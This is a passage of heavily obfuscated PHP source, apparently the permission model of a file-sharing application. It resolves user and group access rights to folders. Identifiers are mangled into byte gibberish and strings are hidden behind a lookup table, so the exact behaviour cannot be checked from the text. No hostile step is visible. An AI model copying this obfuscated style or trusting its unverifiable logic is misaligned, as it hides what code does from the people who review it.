$¥Š¶Ğ°ñ[$ü¡„¤Ì“[193]]; if (isset($ĞÂŸ¥ï²[$Ñº‹ãÀÙ])) { $¥Š¶Ğ°ñ[$ü¡„¤Ì“[2168]][] = $ĞÂŸ¥ï²[$Ñº‹ãÀÙ][0]; $ĞÂŸ¥ï²[$Ñº‹ãÀÙ] = !1; } } $ĞÂŸ¥ï² = array_filter(array_values($ĞÂŸ¥ï²)); $ü±òôß = array_merge($ĞÂŸ¥ï², $ü±òôß); return $ü±òôß; } public function setAllChildrenByUser($”â­ƒöÔ, $¸‘¶ŠÎ, $“’ÛéáÉ) { $Œ—ùú¢ë =& $_SERVER[íïàËŸë]; $ú–¨ÄÆ² = $this->getAllChildrenByUser($”â­ƒöÔ, $¸‘¶ŠÎ); if (!$“’ÛéáÉ || !$ú–¨ÄÆ²) { return !1; } foreach ($ú–¨ÄÆ² as $¾ù¸òç¤) { $˜ááà»è = array(); foreach ($¾ù¸òç¤[$Œ—ùú¢ë[2168]] as $ñ‚Íƒ‚) { $¡ÚöÈó” = $ñ‚Íƒ‚[$Œ—ùú¢ë[540]]; $ªóÜìó¨ = $ñ‚Íƒ‚[$Œ—ùú¢ë[1782]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ùı÷¿Ş· = $ñ‚Íƒ‚[$Œ—ùú¢ë[1782]] ? $ñ‚Íƒ‚[$Œ—ùú¢ë[1782]] : $ñ‚Íƒ‚[$Œ—ùú¢ë[1980]]; if ($ñ‚Íƒ‚[$Œ—ùú¢ë[1782]] && $ñ‚Íƒ‚[$Œ—ùú¢ë[1782]] == $¸‘¶ŠÎ) { continue; } $˜ááà»è[] = array($Œ—ùú¢ë[193] => $¾ù¸òç¤[$Œ—ùú¢ë[193]], $Œ—ùú¢ë[190] => $ªóÜìó¨, $Œ—ùú¢ë[569] => intval($Ùı÷¿Ş·), $Œ—ùú¢ë[2088] => isset($¡ÚöÈó”[$Œ—ùú¢ë[475]]) ? intval($¡ÚöÈó”[$Œ—ùú¢ë[475]]) : 0, $Œ—ùú¢ë[2148] => isset($¡ÚöÈó”[$Œ—ùú¢ë[2148]]) ? intval($¡ÚöÈó”[$Œ—ùú¢ë[2148]]) : -1); } $˜ááà»è[] = array($Œ—ùú¢ë[193] => $¾ù¸òç¤[$Œ—ùú¢ë[193]], $Œ—ùú¢ë[190] => SourceModel::TYPE_USER, $Œ—ùú¢ë[569] => intval($¸‘¶ŠÎ), $Œ—ùú¢ë[2088] => intval($“’ÛéáÉ), $Œ—ùú¢ë[2148] => -1); $this->where(array($Œ—ùú¢ë[491] => $¾ù¸òç¤[$Œ—ùú¢ë[193]]))->delete(); $this->addAll($˜ááà»è); } return !0; } public function get($‡ÜÕ“›Ï) { $ÎÆ‘™’ = $this->getSourceList(array($‡ÜÕ“›Ï), !0); return $ÎÆ‘™’[0]; } public function getSourceList($êˆŒìø, $øØ¡ ÒÒ = false, $ÈĞÃıª = false) { $˜ü˜Ø» =& $_SERVER[íïàËŸë]; if (!$êˆŒìø) { return array(); } $ºËß›çì = Model($˜ü˜Ø»[1428]); if (!$øØ¡ ÒÒ && count($êˆŒìø) == 1) { $øØ¡ ÒÒ = array(); $øØ¡ ÒÒ[$êˆŒìø[0]] = $ºËß›çì->sourceInfo($êˆŒìø[0]); } if (!$øØ¡ ÒÒ) { $’«È  = array($˜ü˜Ø»[491] => array($˜ü˜Ø»[492], $êˆŒìø)); $øØ¡ ÒÒ = $ºËß›çì->field($˜ü˜Ø»[2172])->where($’«È )->select(); $øØ¡ ÒÒ = array_to_keyvalue($øØ¡ ÒÒ, $˜ü˜Ø»[193]); } $¼üî£Òô = $êˆŒìø; foreach ($øØ¡ ÒÒ as $¬“ºÜŞ£ => $ğÄ˜êŒ) { $Û¥Ê¦æ = $ºËß›çì->parentLevelArray($ğÄ˜êŒ[$˜ü˜Ø»[584]]); $¼üî£Òô = array_merge($¼üî£Òô, array($¬“ºÜŞ£), array_reverse($Û¥Ê¦æ)); } $¼üî£Òô = array_values(array_unique($¼üî£Òô)); if (!$¼üî£Òô) { return array(); } $ÁÏÊ§ã¨ = $this->sourceAuthSelect($¼üî£Òô); $Õš³ã¸™ = array(); foreach ($¼üî£Òô as $ï¥¸ë¿¯) { if (isset($ÁÏÊ§ã¨[$ï¥¸ë¿¯])) { $Õš³ã¸™[$ï¥¸ë¿¯] = $ÁÏÊ§ã¨[$ï¥¸ë¿¯]; } } $äèÎõ°Í = $this->userIsRoot($ÈĞÃıª); $É²³±±‹ = AuthModel::authAll(); $ÁîîÛü = array($˜ü˜Ø»[488] => $É²³±±‹, $˜ü˜Ø»[2173] => array($˜ü˜Ø»[493] => 0, $˜ü˜Ø»[1986] => $É²³±±‹, $˜ü˜Ø»[494] => LNG($˜ü˜Ø»[2174]), $˜ü˜Ø»[2003] => $˜ü˜Ø»[2175])); $’¤ñ›Ç” = array(); foreach ($øØ¡ ÒÒ as $ï¥¸ë¿¯ => $ÒË¢¿òÔ) { if ($äèÎõ°Í && $GLOBALS[$˜ü˜Ø»[6]][$˜ü˜Ø»[1999]]) { $’¤ñ›Ç”[$ï¥¸ë¿¯] = $ÁîîÛü; continue; } $’¤ñ›Ç”[$ï¥¸ë¿¯] = $this->makeSourceAuth($ÒË¢¿òÔ, $Õš³ã¸™, $ÈĞÃıª); } return $’¤ñ›Ç”; } public function authDeepCheck($ö¥¤íÒ, $£’­äª = false) { $óÁŞ£³ü =& $_SERVER[íïàËŸë]; $£’­äª = $£’­äª ? $£’­äª : USER_ID; $—œ¶šÕ± = $this->makeAuthDeep($£’­äª); if (!in_array($ö¥¤íÒ, $—œ¶šÕ±[$óÁŞ£³ü[2176]])) { return !1; } $æñÛÒá… = array(); foreach ($—œ¶šÕ±[$óÁŞ£³ü[2177]] as $âúòªê => $‹øÂûæ÷) { if (!in_array($ö¥¤íÒ, $‹øÂûæ÷)) { continue; } $æñÛÒá…[] = $âúòªê; } if (!$æñÛÒá…) { return !1; } $†É€Ü˜ = $æñÛÒá… ? $æñÛÒá…[0] : $ö¥¤íÒ; return array($óÁŞ£³ü[488] => -1, $óÁŞ£³ü[540] => array($óÁŞ£³ü[493] => $óÁŞ£³ü[1284], $óÁŞ£³ü[1986] => $óÁŞ£³ü[228], $óÁŞ£³ü[494] => LNG($óÁŞ£³ü[2178]), $óÁŞ£³ü[2003] => $óÁŞ£³ü[2179]), $óÁŞ£³ü[2180] => LNG($óÁŞ£³ü[2181]), $óÁŞ£³ü[2182] => $this->sourceAuthInfo($†É€Ü˜)); } protected function makeAuthDeep($ÎéÅú¦Á = false) { $¤ÄÀ‡§ =& $_SERVER[íïàËŸë]; static $—¿¥µ³ô = array(); $ÎéÅú¦Á = $ÎéÅú¦Á ? $ÎéÅú¦Á : USER_ID; if (isset($—¿¥µ³ô[$ÎéÅú¦Á])) { return $—¿¥µ³ô[$ÎéÅú¦Á]; } $“¾í¡®¾ = Model($¤ÄÀ‡§[2183])->listData(); $˜°¬ØÇË = array(); foreach ($“¾í¡®¾ as $ëè¸®ç¸) { if ($ëè¸®ç¸[$¤ÄÀ‡§[487]] == 0 && $ëè¸®ç¸[$¤ÄÀ‡§[2002]] == $¤ÄÀ‡§[91]) { $˜°¬ØÇË[] = $ëè¸®ç¸[$¤ÄÀ‡§[475]]; } } $›ì†Ÿ§ = $this->userGroupParents($ÎéÅú¦Á); $œÌ¡º½¢ = array($¤ÄÀ‡§[190] => SourceModel::TYPE_USER, $¤ÄÀ‡§[569] => $ÎéÅú¦Á); if ($›ì†Ÿ§) { $œÌ¡º½¢ = array(array($¤ÄÀ‡§[190] => SourceModel::TYPE_USER, $¤ÄÀ‡§[569] => $ÎéÅú¦Á), array($¤ÄÀ‡§[190] => SourceModel::TYPE_GROUP, $¤ÄÀ‡§[569] => array($¤ÄÀ‡§[492], $›ì†Ÿ§)), $¤ÄÀ‡§[1089] => $¤ÄÀ‡§[2082]); } $”ŠÙâí× = $this->field($¤ÄÀ‡§[2184])->where($œÌ¡º½¢)->select(); $‘á ©µ = array(); $ °Â°äí = array_to_keyvalue_group($”ŠÙâí×, $¤ÄÀ‡§[193]); foreach ($ °Â°äí as $„ë‡»îÖ => $ÛèØŸÀ) { $Ü¸• = $this->authArrayCheck($ÛèØŸÀ, $ÎéÅú¦Á); if ($Ü¸•[$¤ÄÀ‡§[488]] > 0) { $‘á ©µ[] = $„ë‡»îÖ . $¤ÄÀ‡§[12]; } } if ($›ì†Ÿ§) { $öûï·»É = Model($¤ÄÀ‡§[585]); foreach ($›ì†Ÿ§ as $†‰†Õ÷ş) { $Ÿ¸ó§Å = $öûï·»É->getInfo($†‰†Õ÷ş); if (!$Ÿ¸ó§Å || !is_array($Ÿ¸ó§Å[$¤ÄÀ‡§[90]])) { continue; } $‘á ©µ[] = $Ÿ¸ó§Å[$¤ÄÀ‡§[90]][$¤ÄÀ‡§[193]]; } } $´¢˜ÕñÓ = array(); $™é½Ú«€ = $›ì†Ÿ§; $ƒšáÙ = Model($¤ÄÀ‡§[1428]); $öûï·»É = Model($¤ÄÀ‡§[585]); $Ã†óóÜ½ = array(); $ˆÄÂÀ¼ = array(); $ıı©™°÷ = array(); $êÒ´àğŞ = array(); if ($‘á ©µ) { $®„“¡©â = $ƒšáÙ->where(array($¤ÄÀ‡§[193] => array($¤ÄÀ‡§[492], $‘á ©µ)))->select(); foreach ($®„“¡©â as $ÔÉôÊÀ²) { $óÊ¤ˆ£ = $ƒšáÙ->parentLevelArray($ÔÉôÊÀ²[$¤ÄÀ‡§[584]]); $´¢˜ÕñÓ = array_merge($´¢˜ÕñÓ, $óÊ¤ˆ£); $™é½Ú«€[] = $ÔÉôÊÀ²[$¤ÄÀ‡§[569]]; $Ã†óóÜ½[$ÔÉôÊÀ²[$¤ÄÀ‡§[193]]] = $óÊ¤ˆ£; $ˆÄÂÀ¼[$ÔÉôÊÀ²[$¤ÄÀ‡§[193]]] = $ÔÉôÊÀ²[$¤ÄÀ‡§[569]]; } } $™é½Ú«€ = array_values(array_unique($™é½Ú«€)); $ÚäÙÂ³ˆ = $™é½Ú«€; foreach ($ÚäÙÂ³ˆ as $†‰†Õ÷ş) { $Ÿ¸ó§Å = $öûï·»É->getInfo($†‰†Õ÷ş); $óÊ¤ˆ£ = $ƒšáÙ->parentLevelArray($Ÿ¸ó§Å[$¤ÄÀ‡§[584]]); $™é½Ú«€ = array_merge($™é½Ú«€, $óÊ¤ˆ£); } $™é½Ú«€ = array_values(array_unique($™é½Ú«€)); foreach ($™é½Ú«€ as $†‰†Õ÷ş) { $Ÿ¸ó§Å = $öûï·»É->getInfo($†‰†Õ÷ş); $´¢˜ÕñÓ[] = $Ÿ¸ó§Å[$¤ÄÀ‡§[90]][$¤ÄÀ‡§[193]]; $ıı©™°÷[$†‰†Õ÷ş] = $Ÿ¸ó§Å[$¤ÄÀ‡§[90]][$¤ÄÀ‡§[193]]; $êÒ´àğŞ[$†‰†Õ÷ş] = $ƒšáÙ->parentLevelArray($Ÿ¸ó§Å[$¤ÄÀ‡§[584]]); } foreach ($Ã†óóÜ½ as $ØÈÔ‘œÉ => $Şø™¬Í…) { $ä´»â„­ = $ˆÄÂÀ¼[$ØÈÔ‘œÉ]; if (!$ä´»â„­ || !$ıı©™°÷[$ä´»â„­]) { continue; } $Í¨ıÆ±³ = array(); foreach ($êÒ´àğŞ[$ä´»â„­] as $†‰†Õ÷ş) { $Í¨ıÆ±³[] = $ıı©™°÷[$†‰†Õ÷ş]; } $Ã†óóÜ½[$ØÈÔ‘œÉ] = array_merge($Í¨ıÆ±³, $Şø™¬Í…); } $´¢˜ÕñÓ = array_values(array_unique($´¢˜ÕñÓ)); $„â…«ğ‚ = array($¤ÄÀ‡§[2176] => $´¢˜ÕñÓ, $¤ÄÀ‡§[2177] => $Ã†óóÜ½); $—¿¥µ³ô[$ÎéÅú¦Á] = $„â…«ğ‚; return $„â…«ğ‚; } private function makeSourceAuth($ì²ÑÛ½È, $¾Ë”Ä, $º«ïÌ©Ç = false) { $Á¦“Çç =& $_SERVER[íïàËŸë]; $œû†óø = $Á¦“Çç[91]; $ø²Ç´ = $ì²ÑÛ½È[$Á¦“Çç[569]]; $í”“§å = $ì²ÑÛ½È[$Á¦“Çç[190]] == SourceModel::TYPE_GROUP; $‰ë †ÌÜ = $í”“§å ? $this->groupRootAuth($ø²Ç´, $º«ïÌ©Ç) : !1; if ($‰ë †ÌÜ && Model($Á¦“Çç[571])->authCheckAction($‰ë †ÌÜ[$Á¦“Çç[487]], $Á¦“Çç[2001])) { return $this->groupAuthInfo($‰ë †ÌÜ, $ø²Ç´); } $û…ëõª = Model($Á¦“Çç[1428])->parentLevelArray($ì²ÑÛ½È[$Á¦“Çç[584]]); $û…ëõª = array_merge(array($ì²ÑÛ½È[$Á¦“Çç[193]]), array_reverse($û…ëõª)); $«ãëÄó¶ = !1; foreach ($û…ëõª as $Óì’Şã°) { if (!isset($¾Ë”Ä[$Óì’Şã°])) { continue; } $Ê¥¹›ø® = $this->authMake($¾Ë”Ä[$Óì’Şã°], $º«ïÌ©Ç); if ($Ê¥¹›ø®[$Á¦“Çç[540]]) { $«ãëÄó¶ = $Ê¥¹›ø®; break; } } if (!$í”“§å) { return $«ãëÄó¶; } if (!$«ãëÄó¶ && $‰ë †ÌÜ) { $«ãëÄó¶ = $this->groupAuthInfo($‰ë †ÌÜ, $ø²Ç´); } if (!$«ãëÄó¶) { $¼Ü©ì…û = Model($Á¦“Çç[585])->getInfo($ø²Ç´); $Ê³™ÄÒŞ = explode($Á¦“Çç[50], trim($¼Ü©ì…û[$Á¦“Çç[584]], $Á¦“Çç[50])); $Ê³™ÄÒŞ = array_reverse($Ê³™ÄÒŞ); foreach ($Ê³™ÄÒŞ as $ÍµÈ´ı†) { if ($ÍµÈ´ı† == $Á¦“Çç[228] || $ÍµÈ´ı† == $œû†óø) { continue; } $Ã±ÄÅÊª = $this->groupRootAuth($ÍµÈ´ı†, $º«ïÌ©Ç); if (!$Ã±ÄÅÊª) { continue; } $«ãëÄó¶ = $this->groupAuthInfo($Ã±ÄÅÊª, $ÍµÈ´ı†); break; } } if (!$«ãëÄó¶ || $«ãëÄó¶[$Á¦“Çç[488]] <= 0) { $»Şú†öÔ = $this->authDeepCheck($ì²ÑÛ½È[$Á¦“Çç[193]], $º«ïÌ©Ç); if ($»Şú†öÔ) { $«ãëÄó¶ = $»Şú†öÔ; } } return $«ãëÄó¶; } private function userIsRoot($ëÌÊş’ = false) { $ıÊªÄŒ¥ =& $_SERVER[íïàËŸë]; if (!$ëÌÊş’ && KodUser::isRoot()) { return !0; } $Î¤ãæ„ = Model($ıÊªÄŒ¥[598])->getInfo($ëÌÊş’); $½³ÖÜûß = Model($ıÊªÄŒ¥[2185])->listData($Î¤ãæ„[$ıÊªÄŒ¥[2186]]); if ($½³ÖÜûß && $½³ÖÜûß[$ıÊªÄŒ¥[575]][$ıÊªÄŒ¥[2187]] == 1) { return !0; } return !1; } private function sourceAuthInfo($®é­¥òÛ) { $åËÙİ¡« =& $_SERVER[íïàËŸë]; $˜ŸİÒ´Ä = Model($åËÙİ¡«[1428]); $üÕ€ãëé = $˜ŸİÒ´Ä->sourceInfo($®é­¥òÛ); if (!$üÕ€ãëé) { return !1; } $˜ŸİÒ´Ä->groupPathDisplay($üÕ€ãëé); $é´­Œ¶Ú = array($üÕ€ãëé); $é´­Œ¶Ú = $˜ŸİÒ´Ä->_listAppendPath($é´­Œ¶Ú); $üÕ€ãëé = $é´­Œ¶Ú[0]; $ùØ¾Úì± = $üÕ€ãëé[$åËÙİ¡«[582]]; if (isset($üÕ€ãëé[$åËÙİ¡«[590]])) { $í÷ÚÓ»ç = explode($åËÙİ¡«[8], trim($üÕ€ãëé[$åËÙİ¡«[582]], $åËÙİ¡«[8])); array_shift($í÷ÚÓ»ç); $ùØ¾Úì± = $üÕ€ãëé[$åËÙİ¡«[588]] . $åËÙİ¡«[2188] . implode($åËÙİ¡«[8], $í÷ÚÓ»ç); } return array($åËÙİ¡«[494] => $üÕ€ãëé[$åËÙİ¡«[32]], $åËÙİ¡«[87] => KodIO::make($üÕ€ãëé[$åËÙİ¡«[193]]), $åËÙİ¡«[2189] => $ùØ¾Úì±); } private function groupAuthInfo($áÓ±Ù±½, $ïŞõ´ÛÊ) { $˜ÄĞéÆæ =& $_SERVER[íïàËŸë]; $èìæ†÷® = Model($˜ÄĞéÆæ[585])->getInfo($ïŞõ´ÛÊ); return array($˜ÄĞéÆæ[2190] => intval($áÓ±Ù±½[$˜ÄĞéÆæ[487]]), $˜ÄĞéÆæ[2173] => $áÓ±Ù±½, $˜ÄĞéÆæ[2191] => LNG($˜ÄĞéÆæ[2192]), $˜ÄĞéÆæ[2182] => array($˜ÄĞéÆæ[494] => $èìæ†÷®[$˜ÄĞéÆæ[32]], $˜ÄĞéÆæ[87] => KodIO::make($èìæ†÷®[$˜ÄĞéÆæ[90]][$˜ÄĞéÆæ[193]]), $˜ÄĞéÆæ[2189] => $èìæ†÷®[$˜ÄĞéÆæ[589]])); } protected function groupRootAuth($åõÎ€³, $ÕëŠ»…İ = false) { $²‚´ß©¨ =& $_SERVER[íïàËŸë]; $ÕëŠ»…İ = $ÕëŠ»…İ ? $ÕëŠ»…İ : USER_ID; $ãØª«§× = $ÕëŠ»…İ . $²‚´ß©¨[2193] . $åõÎ€³; static $üñåğÀé = array(); if (isset($üñåğÀé[$ãØª«§×])) { return $üñåğÀé[$ãØª«§×]; } $Œ»ŠŸ´¾ = Model($²‚´ß©¨[585])->getInfo($åõÎ€³); $Ø¨Í†È· = $this->userGroupList($ÕëŠ»…İ); $åï îªå = isset($Ø¨Í†È·[$åõÎ€³]) ? $Ø¨Í†È·[$åõÎ€³][$²‚´ß©¨[487]] : !1; if ($åï îªå && Model($²‚´ß©¨[571])->authCheckAction($åï îªå[$²‚´ß©¨[487]], $²‚´ß©¨[2001])) { $üñåğÀé[$ãØª«§×] = $åï îªå; return $åï îªå; } $ºÉ½‚ = $this->sourceAuthSelect($Œ»ŠŸ´¾[$²‚´ß©¨[90]][$²‚´ß©¨[193]]); $›Ş¤à½å = $ºÉ½‚ ? $this->authMake($ºÉ½‚, $ÕëŠ»…İ) : !1; $™®òÏ½ = $›Ş¤à½å ? $›Ş¤à½å[$²‚´ß©¨[540]] : !1; $üñåğÀé[$ãØª«§×] = $™®òÏ½ ? $™®òÏ½ : $åï îªå; return $üñåğÀé[$ãØª«§×]; } public function authOwnerApply($¾½Í‡ëÖ) { $Õëø® =& $_SERVER[íïàËŸë]; if (empty($¾½Í‡ëÖ[$Õëø®[487]]) || isset($¾½Í‡ëÖ[$Õëø®[2194]]) && $¾½Í‡ëÖ[$Õëø®[2194]]) { return $¾½Í‡ëÖ; } if (AuthModel::authCheckRoot($¾½Í‡ëÖ[$Õëø®[487]][$Õëø®[488]])) { return $¾½Í‡ëÖ; } $ÓÇ°Êùä = Model($Õëø®[1428])->parentLevelArray($¾½Í‡ëÖ[$Õëø®[584]]); $ÓÇ°Êùä = array_merge(array($¾½Í‡ëÖ[$Õëø®[193]]), array_reverse($ÓÇ°Êùä)); $Ï²Ö…óé = $this->sourceAuthSelect($ÓÇ°Êùä); $­øæŞòÜ = array(); $ØØƒñ±¡ = array(); foreach ($Ï²Ö…óé as $Ü¡Í–¦ => $õûµ€Â) { $µşä…ºº = $this->authFolderOwnerUser($õûµ€Â); $­øæŞòÜ[$Ü¡Í–¦] = $µşä…ºº; $ØØƒñ±¡ = array_merge($ØØƒñ±¡, $µşä…ºº[$Õëø®[662]]); if ($µşä…ºº[$Õëø®[2195]]) { break; } } if (count($ØØƒñ±¡) == 0) { $ØØƒñ±¡ = $this->authFolderOwnerGroup($¾½Í‡ëÖ[$Õëø®[569]]); } $ØØƒñ±¡ = array_unique($ØØƒñ±¡); if (AuthModel::authCheckRoot($¾½Í‡ëÖ[$Õëø®[487]][$Õëø®[488]])) { $ØØƒñ±¡[] = USER_ID; } $¾½Í‡ëÖ[$Õëø®[487]][$Õëø®[2196]] = Model($Õëø®[577])->userListInfo($ØØƒñ±¡); return $¾½Í‡ëÖ; } private function authFolderOwnerGroup($ÖªåùŠ´) { $©…Œ® =& $_SERVER[íïàËŸë]; $¤ÜŒİÚ¨ = Model($©…Œ®[2074])->where(array($©…Œ®[1980] => $ÖªåùŠ´))->select(); $¹Õ¥ÌØ¦ = array(); if (!$¤ÜŒİÚ¨) { return $¹Õ¥ÌØ¦; } foreach ($¤ÜŒİÚ¨ as $Úñ‘ à‡) { $ÊÓÒ˜Ğè = $this->authInfo($Úñ‘ à‡); if (AuthModel::authCheckRoot($ÊÓÒ˜Ğè[$©…Œ®[487]])) { $¹Õ¥ÌØ¦[] = $Úñ‘ à‡[$©…Œ®[1782]]; } } return $¹Õ¥ÌØ¦; } private function authFolderOwnerUser($†¼ìöĞ¼) { $×ıñ¯Ù¢ =& $_SERVER[íïàËŸë]; $€‹ıĞıô = array(); $İÓˆˆ« = !1; foreach ($†¼ìöĞ¼ as $È·¢Ë˜ò) { $äÀˆ ü = $this->authInfo($È·¢Ë˜ò); if ($È·¢Ë˜ò[$×ıñ¯Ù¢[569]] == $×ıñ¯Ù¢[228]) { $İÓˆˆ« = !0; } if ($È·¢Ë˜ò[$×ıñ¯Ù¢[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($äÀˆ ü[$×ıñ¯Ù¢[487]])) { $€‹ıĞıô[] = $È·¢Ë˜ò[$×ıñ¯Ù¢[569]]; } } } return array($×ıñ¯Ù¢[662] => $€‹ıĞıô, $×ıñ¯Ù¢[2195] => $İÓˆˆ«); } public function authMake($šâÂá¯Í, $â”ºø¡Ş = false) { $­Ë©„©Š =& $_SERVER[íïàËŸë]; $çÓæ’ìş = $this->authArrayCheck($šâÂá¯Í, $â”ºø¡Ş); if ($çÓæ’ìş[$­Ë©„©Š[2197]]) { $çÓæ’ìş[$­Ë©„©Š[2197]] = $this->sourceAuthInfo($çÓæ’ìş[$­Ë©„©Š[2197]]); } return $çÓæ’ìş; } public function authArrayCheck($©šÎƒ‡Ş, $‚®î¼ÏÊ = false) { $µÂüÓŞ¬ =& $_SERVER[íïàËŸë]; if (!$©šÎƒ‡Ş) { return array($µÂüÓŞ¬[488] => 0, $µÂüÓŞ¬[540] => !1); } $‚®î¼ÏÊ = $‚®î¼ÏÊ ? $‚®î¼ÏÊ : USER_ID; $ş‚øÆû = 0; $¹œŠÊôÅ = 0; $¦¿ĞŸ´ = 0; $íşÚø€Å = 0; $Ö„„ùîØ = 0; $ÑĞ—ï¥º = 0; $›åÙ…§ = 1000; $õÑœõñ‹ = 0; $îüĞ«ô = 0; $Á³—à¶ = 0; $ìÁÍìï = 0; $Õøé˜ó = array($µÂüÓŞ¬[193] => 0); foreach ($©šÎƒ‡Ş as $Õøé˜ó) { $ò¥àòøØ = $this->authInfo($Õøé˜ó); if (!$ò¥àòøØ) { continue; } $›Ö¸ç§® = $Õøé˜ó[$µÂüÓŞ¬[569]]; $‘×éëÑ› = intval($ò¥àòøØ[$µÂüÓŞ¬[487]]); if ($Õøé˜ó[$µÂüÓŞ¬[190]] == SourceModel::TYPE_USER && $›Ö¸ç§® == $‚®î¼ÏÊ) { $ş‚øÆû = !0; $¦¿ĞŸ´ = $ò¥àòøØ; $¹œŠÊôÅ = $‘×éëÑ›; } else { if ($Õøé˜ó[$µÂüÓŞ¬[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($›Ö¸ç§®, $‚®î¼ÏÊ)) { $íşÚø€Å = !0; $ÎËùîˆê = $this->groupStepToUserGroup($›Ö¸ç§®, $‚®î¼ÏÊ); if ($ÎËùîˆê < $›åÙ…§) { $›åÙ…§ = $ÎËùîˆê; $Ö„„ùîØ = $‘×éëÑ›; $ÑĞ—ï¥º = $ò¥àòøØ; $õÑœõñ‹ = $›Ö¸ç§®; } if ($ÎËùîˆê == $›åÙ…§ && $‘×éëÑ› >= $Ö„„ùîØ) { $Ö„„ùîØ = $‘×éëÑ›; $ÑĞ—ï¥º = $ò¥àòøØ; $õÑœõñ‹ = $›Ö¸ç§®; } } else { if ($›Ö¸ç§® == $µÂüÓŞ¬[228]) { $îüĞ«ô = !0; $ìÁÍìï = $ò¥àòøØ; $Á³—à¶ = $‘×éëÑ›; } } } } if ($ş‚øÆû) { $¨ÒÁ–Ğ‹ = $¹œŠÊôÅ; $ò¥àòøØ = $¦¿ĞŸ´; $ûÁÀƒ» = LNG($µÂüÓŞ¬[2198]); } else { if ($íşÚø€Å) { $¨ÒÁ–Ğ‹ = $Ö„„ùîØ; $ò¥àòøØ = $ÑĞ—ï¥º; $áùå¢¥Æ = Model($µÂüÓŞ¬[585])->getInfo($õÑœõñ‹); $ûÁÀƒ» = $µÂüÓŞ¬[176] . $áùå¢¥Æ[$µÂüÓŞ¬[589]] . $µÂüÓŞ¬[2199] . LNG($µÂüÓŞ¬[2200]); } else { if ($îüĞ«ô) { $¨ÒÁ–Ğ‹ = $Á³—à¶; $ò¥àòøØ = $ìÁÍìï; $ûÁÀƒ» = LNG($µÂüÓŞ¬[2170]); } else { $¨ÒÁ–Ğ‹ = 0; $ò¥àòøØ = !1; $ûÁÀƒ» = $µÂüÓŞ¬[12]; } } } $÷å‚Á = array($µÂüÓŞ¬[2190] => intval($¨ÒÁ–Ğ‹), $µÂüÓŞ¬[2173] => $ò¥àòøØ, $µÂüÓŞ¬[2191] => $ûÁÀƒ», $µÂüÓŞ¬[2182] => $Õøé˜ó[$µÂüÓŞ¬[193]]); return $÷å‚Á; } private function groupContainUser($š–¬‹Şù, $ÁÅˆÁÂ— = false) { return in_array($š–¬‹Şù, $this->userGroupParents($ÁÅˆÁÂ—)); } private function groupStepToUserGroup($¯ù‡¸²—, $¿Ç˜ª’ = false) { $÷–¡¦Â =& $_SERVER[íïàËŸë]; $Ñ•ŠÁ¯ß = $this->userGroupList($¿Ç˜ª’); $¶ÃµœÖå = 1000; $¥¾ú™’Œ = $GLOBALS[$÷–¡¦Â[6]][$÷–¡¦Â[92]][$÷–¡¦Â[2087]] == 1; $ñÔö€ù = $¥¾ú™’Œ ? 3 : 2; foreach ($Ñ•ŠÁ¯ß as $±Ö±Ù¥à) { if ($±Ö±Ù¥à[$÷–¡¦Â[1980]] == $¯ù‡¸²—) { return 0; } $†Æ‹İš = explode($÷–¡¦Â[50], trim($±Ö±Ù¥à[$÷–¡¦Â[584]], $÷–¡¦Â[50])); if ($†Æ‹İš[0] == $÷–¡¦Â[228] && count($†Æ‹İš) > $ñÔö€ù) { $ÈŸ—•Õ¯ = array_reverse(array_slice($†Æ‹İš, $ñÔö€ù)); $‚êÂÏö§ = array_search($¯ù‡¸²—, $ÈŸ—•Õ¯); if ($‚êÂÏö§ !== !1 && $‚êÂÏö§ + 1 <= $¶ÃµœÖå) { $¶ÃµœÖå = $‚êÂÏö§ + 1; } } } return $¶ÃµœÖå; } private function userGroupList($ÀœÜ€å = false) { $ÙÌ·»ˆÒ =& $_SERVER[íïàËŸë]; static $´Áæ»  = array(); if (isset($´Áæ» [$ÀœÜ€å])) { return $´Áæ» [$ÀœÜ€å]; } $ÓÜö¬ = Model($ÙÌ·»ˆÒ[598])->getInfo($ÀœÜ€å); $´Áæ» [$ÀœÜ€å] = array_to_keyvalue($ÓÜö¬[$ÙÌ·»ˆÒ[2171]], $ÙÌ·»ˆÒ[1980]); return $´Áæ» [$ÀœÜ€å]; } public function userGroupParents($ÒòÍ¡ö¯) { $È‡İâË =& $_SERVER[íïàËŸë]; static $ª­Ø‚ú = array(); $ÒòÍ¡ö¯ = $ÒòÍ¡ö¯ ? $ÒòÍ¡ö¯ : USER_ID; if (isset($ª­Ø‚ú[$ÒòÍ¡ö¯])) { return $ª­Ø‚ú[$ÒòÍ¡ö¯]; } $­©§¾ØŸ = $this->userGroupList($ÒòÍ¡ö¯); $Ä¶»êË¨ = array(); $Ü‡İ’©Œ = $GLOBALS[$È‡İâË[6]][$È‡İâË[92]][$È‡İâË[2087]] == 1; $ØŞÒ†¨ğ = $Ü‡İ’©Œ ? 3 : 2; foreach ($­©§¾ØŸ as $ÕíØé¶Â) { $Ñó¡‚®® = array($ÕíØé¶Â[$È‡İâË[1980]]); $ş¿€’›Š = explode($È‡İâË[50], trim($ÕíØé¶Â[$È‡İâË[584]], $È‡İâË[50])); if ($ş¿€’›Š[0] == $È‡İâË[228] && count($ş¿€’›Š) > $ØŞÒ†¨ğ) { $©°øÖ¡ = array_slice($ş¿€’›Š, $ØŞÒ†¨ğ); $Ñó¡‚®® = array_merge($Ñó¡‚®®, array_reverse($©°øÖ¡)); } $Ä¶»êË¨ = array_merge($Ä¶»êË¨, $Ñó¡‚®®); } $ª­Ø‚ú[$ÒòÍ¡ö¯] = array_unique($Ä¶»êË¨); return $ª­Ø‚ú[$ÒòÍ¡ö¯]; } public function authTargetInfoMake($üĞ·€) { $ï¼ÈÊ =& $_SERVER[íïàËŸë]; $°¯ÉûÂ = array(); $—º•’úé = array(); foreach ($üĞ·€ as $ê¦­¯Ü‰) { if ($ê¦­¯Ü‰[$ï¼ÈÊ[190]] == SourceModel::TYPE_USER) { $°¯ÉûÂ[] = intval($ê¦­¯Ü‰[$ï¼ÈÊ[569]]); } else { if ($ê¦­¯Ü‰[$ï¼ÈÊ[190]] == SourceModel::TYPE_GROUP) { $—º•’úé[] = intval($ê¦­¯Ü‰[$ï¼ÈÊ[569]]); } } } if ($°¯ÉûÂ) { $°¯ÉûÂ = Model($ï¼ÈÊ[577])->userListInfo($°¯ÉûÂ); } if ($—º•’úé) { $·¡¤º§ø = array($ï¼ÈÊ[2072] => array($ï¼ÈÊ[492], $—º•’úé)); $—º•’úé = 